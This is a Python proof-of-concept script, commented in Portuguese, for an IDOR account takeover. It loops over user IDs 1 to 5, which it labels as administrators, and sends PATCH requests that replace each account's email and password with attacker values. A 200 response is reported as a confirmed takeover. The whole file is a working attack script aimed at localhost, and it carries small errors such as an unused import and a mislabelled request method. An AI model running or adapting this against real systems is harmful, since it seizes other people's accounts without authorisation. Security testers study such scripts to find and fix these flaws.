import requests
from json import dumps
import os

# Importação de JWT library (exemplo: pyjwt) - substitua pelo seu library preferido
from cryptography.fernet import Fernet
from jwt import encode, decode

# Configuração da API de teste 
API_ENDPOINT = "http://localhost:8080/api/users/"  
JWT_SECRET_KEY = os.environ.get('JWT_SECRET_KEY') # Obtenha a chave de segurança do ambiente

# Fase 1: Função para definir o cabeçalho Authorization com JWT
def create_authorization_header(token):
    return {
        'Authorization': f"Bearer {token}"  
    }


# Fase 2: Função para criar o payload JSON
def get_payload():
    user = {
      "email": "pwned@hacker.com",
      "senha": "Pwned123!"
    }
    return user

# Fase 3: Loop de teste e verificação IDOR
for id in range(1, 6): # Loop para testar IDs de usuários de administrador
    payload = get_payload()
    headers = create_authorization_header("token_jwt")  

    try:
        response = requests.patch(API_ENDPOINT + str(id), json=payload, headers=headers)
        if response.status_code == 200:
            print(f'Account Takeover por IDOR confirmado no endpoint para ID {id}') # Registar o evento de sucesso se a requisição for bem-sucedida
        else: 
            print(f"Requisição falhou com status code {response.status_code} para ID {id}")  # Registrar erros caso a requisição seja bem-sucedida
    except Exception as e:
        print(f"Ocorreu um erro ao realizar o POST: {e}")
